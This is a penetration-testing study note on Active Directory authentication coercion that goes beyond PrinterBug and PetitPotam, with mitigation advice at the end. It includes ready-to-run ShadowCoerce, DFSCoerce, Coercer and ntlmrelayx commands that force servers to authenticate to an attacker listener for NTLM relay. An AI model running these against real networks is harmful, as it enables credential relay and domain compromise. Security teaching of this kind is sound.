---
tags: [active-directory, advanced, exotic, cross-forest, vapt]
difficulty: advanced
module: "78 - Active Directory Exotic Protocols and Cross-Forest"
topic: "78.09 PrinterBug and PetitPotam Alternatives"
---

# PrinterBug and PetitPotam Alternatives

## 1. The Evolution of Coercion Protocols

The discovery of the MS-RPRN (PrinterBug) by Lee Christensen in 2018 fundamentally shifted the landscape of Active Directory exploitation. It demonstrated that an attacker could reliably force a Windows machine, including a Domain Controller, to authenticate to an arbitrary IP address over SMB or HTTP. This coercion, combined with NTLM relaying or Kerberos Unconstrained Delegation, led to immediate domain compromise.

Following PrinterBug, Gilles Lionel discovered MS-EFSRPC (PetitPotam) in 2021, which exploited the Encrypting File System Remote Protocol to achieve the same result without requiring valid credentials in some configurations. 

Microsoft has heavily patched these specific vectors (e.g., CVE-2021-36942 for PetitPotam, and hardening the Print Spooler service). However, the underlying architectural flaw—Windows services exposing RPC endpoints that can be instructed to connect to remote UNC paths—remains prevalent. As defenders disable the Print Spooler and block MS-EFSRPC, attackers have cataloged numerous alternative RPC protocols that serve the exact same coercion purpose.

### 1.1 Why Coercion is Critical
Coercion is the catalyst for relay attacks. Without a method to force high-value targets (like Domain Controllers, Exchange Servers, or ADFS servers) to initiate an authentication request, attackers must passively wait for traffic, which is highly unreliable. Coercion guarantees on-demand authentication.

---

## 2. Advanced Coercion Alternatives

As PrinterBug and PetitPotam become less viable in mature environments, several lesser-known RPC interfaces have been weaponized to perform remote authentication coercion.

### 2.1 MS-FSRVP (ShadowCoerce)
The File Server Remote VSS Protocol (MS-FSRVP) is used to manage volume shadow copies on remote systems. The RPC endpoint `\PIPE\FSRVP` exposes several methods that can be manipulated.
-   **Vulnerability:** The `IsPathSupported` method allows a client to specify a UNC path. When the server processes this request, it attempts to access the provided UNC path, triggering an authentication attempt.
-   **Tool:** `ShadowCoerce.py`
-   **Usage:**
    ```bash
    shadowcoerce.py -d corp.local -u user -p password attacker_ip target_ip
    ```
-   **Requirements:** Requires valid domain credentials. The `File Server VSS Agent Service` must be running or capable of being triggered.

### 2.2 MS-DFSNM (DFSCoerce)
The Distributed File System Namespace Management Protocol (MS-DFSNM) allows administrators to manage DFS namespaces.
-   **Vulnerability:** Methods like `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` take a ServerName parameter. By providing a malicious UNC path, the target server will attempt to connect to it.
-   **Tool:** `DFSCoerce.py`
-   **Usage:**
    ```bash
    dfscoerce.py -d corp.local -u user -p password attacker_ip target_ip
    ```
-   **Requirements:** Requires valid credentials. Extremely effective against Domain Controllers as they natively host the DFS infrastructure for SYSVOL replication.

### 2.3 MS-FAS (WebClient / WebDAV Coercion)
While not a specific RPC bug, the WebClient service in Windows can be coerced to authenticate over HTTP instead of SMB.
-   **Vulnerability:** By pointing any coercion tool (like PrinterBug or PetitPotam) to a UNC path formatted for WebDAV (e.g., `\\attacker_ip@80\share`), the target server's WebClient service will intercept the call and attempt an HTTP GET request with NTLM authentication.
-   **Significance:** This explicitly bypasses SMB signing protections and the "Drop the Mic" cross-protocol relay mitigations, allowing the attacker to relay the HTTP authentication to LDAP, AD CS, or MSSQL.
-   **Requirements:** The WebClient service must be running on the target. This is often disabled on servers by default but may be enabled on workstations or specific application servers.

### 2.4 MS-EVEN6 (Coercer / Event Viewer)
The EventLog Remoting Protocol Version 6.0 (MS-EVEN6) is used by the Event Viewer to connect to remote machines.
-   **Vulnerability:** Similar to other protocols, certain methods within the RPC interface will accept UNC paths, causing the system to perform a remote path resolution and thereby leaking NTLM credentials.
-   **Tool:** `Coercer.py` (a wrapper tool that automates scanning for and exploiting dozens of RPC coercion vulnerabilities).

---

## 3. Visualizing the Coercion Attack Surface

The following diagram illustrates the various RPC endpoints available on a typical Windows Server and how they can be triggered to connect back to an attacker's listener.

```text
+-------------------------------------------------------------------------+
|                        Target Windows Server (e.g., DC01)               |
|                                                                         |
|  +-------------------------------------------------------------------+  |
|  |                       RPC Endpoint Mapper (Port 135)              |  |
|  +-------+---------------+---------------+---------------+-----------+  |
|          |               |               |               |              |
|          v               v               v               v              |
|  +-------+-------+ +-----+-------+ +-----+-------+ +-----+-------+      |
|  | MS-RPRN       | | MS-EFSRPC   | | MS-FSRVP    | | MS-DFSNM    |      |
|  | (Spooler)     | | (EFS)       | | (ShadowCopy)| | (DFS Namesp)|      |
|  | \PIPE\spoolss | | \PIPE\lsarpc| | \PIPE\FSRVP | | \PIPE\netdfs|      |
|  +-------+-------+ +-----+-------+ +-----+-------+ +-----+-------+      |
|          |               |               |               |              |
+----------|---------------|---------------|---------------|--------------+
           |               |               |               |
           | 1. Attacker sends crafted RPC request to vulnerable endpoint
           |    Payload: "Connect to \\192.168.1.50\share"
           v               v               v               v
+----------+---------------+---------------+---------------+--------------+
|                                                                         |
|                       Attacker Listener Environment                     |
|                                                                         |
|  +-------------------------+            +----------------------------+  |
|  | SMB Listener (Port 445) |            | HTTP Listener (Port 80)    |  |
|  | (ntlmrelayx / Inveigh)  |   <----->  | (WebDAV Coercion Bypass)   |  |
|  +-------------------------+            +----------------------------+  |
|                                                                         |
|       2. Server responds with NTLM Negotiate -> Attacker Relays         |
+-------------------------------------------------------------------------+
```

---

## 4. Automating Coercion with `Coercer`

Identifying which specific RPC endpoints are active, exposed, and vulnerable on a target server can be tedious. The Python tool `Coercer` (developed by p0dalirius) automates this process. It systematically connects to a target over SMB/RPC and enumerates known vulnerable RPC endpoints, attempting to trigger authentication back to the attacker.

### Example Usage of `Coercer`

1.  **Start the Relay Listener:**
    Set up `ntlmrelayx.py` to listen for incoming connections and relay them to a target domain controller (e.g., via LDAP to modify `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD).
    ```bash
    ntlmrelayx.py -t ldap://192.168.1.10 -smb2support --delegate-access
    ```

2.  **Execute Coercer:**
    Run `Coercer` against the target machine (e.g., an Exchange server), pointing it to the attacker's listener IP.
    ```bash
    coercer coerce -u "user" -p "password" -d "corp.local" -t 192.168.1.20 -l 192.168.1.50
    ```

3.  **Observation:**
    `Coercer` will iterate through MS-RPRN, MS-EFSRPC, MS-FSRVP, MS-DFSNM, and dozens of other RPC interfaces. If one is enabled and vulnerable, the target server will immediately connect to `192.168.1.50`, completing the coercion chain.

---

## 5. Defensive Considerations and Mitigation

Because the root cause of these vulnerabilities is intrinsic to the design of Windows RPC and MS-RPC protocols, patching them individually is a game of "whack-a-mole." A holistic defensive strategy is required.

### 5.1 Disable Unnecessary Services
The most effective defense against specific protocols is to disable the underlying service.
-   Disable the Print Spooler service on all Domain Controllers and critical servers.
-   Disable the File Server VSS Agent Service if not actively used.
-   Disable the WebClient service globally to prevent WebDAV downgrade attacks.

### 5.2 Implement RPC Filters
Windows provides the ability to filter RPC traffic using the Windows Filtering Platform (WFP) or via the `RpcView` mechanisms. Defenders can configure RPC filters to block remote, unauthenticated, or even authenticated access to specific UUIDs (like MS-EFSRPC) from non-administrative subnets.

### 5.3 Enforce SMB Signing and LDAP Channel Binding
To render the coerced authentication useless, the destination services must be secured.
-   Enforce SMB Signing universally across the domain to prevent SMB-to-SMB relaying.
-   Enforce LDAP Channel Binding and LDAP Signing to prevent SMB/HTTP-to-LDAP relaying.
-   Enable Extended Protection for Authentication (EPA) on IIS and Exchange.

### 5.4 Account Tiering and Delegation
Ensure that high-value machine accounts (like Domain Controllers) are not placed in groups where their coercion would lead to compromise (e.g., ensure they do not have unconstrained delegation, and limit their permissions on secondary systems).

---

## 6. Chaining Opportunities

- **[[08 - Advanced NTLM Relaying to MSSQL]]**: Once a target like a file server is coerced using DFSCoerce, its authentication can be relayed to an MSSQL instance to achieve database compromise.
- **[[10 - Abuse of Exchange Web Services in AD]]**: Exchange servers are notorious for having high privileges. Coercing an Exchange server using ShadowCoerce and relaying it to a Domain Controller can instantly elevate an attacker to Domain Admin.
- **[[02 - Local Privilege Escalation Techniques in Windows]]**: In some scenarios, local coercion (coercing the local `SYSTEM` account to authenticate to a local relay listener) can be used for rapid privilege escalation.

## 7. Related Notes

- [[01 - Introduction to Active Directory Trusts]]
- [[04 - Extracting and Reversing DPAPI Secrets]]
- [[07 - Bypassing LSA Protection and Credential Guard]]
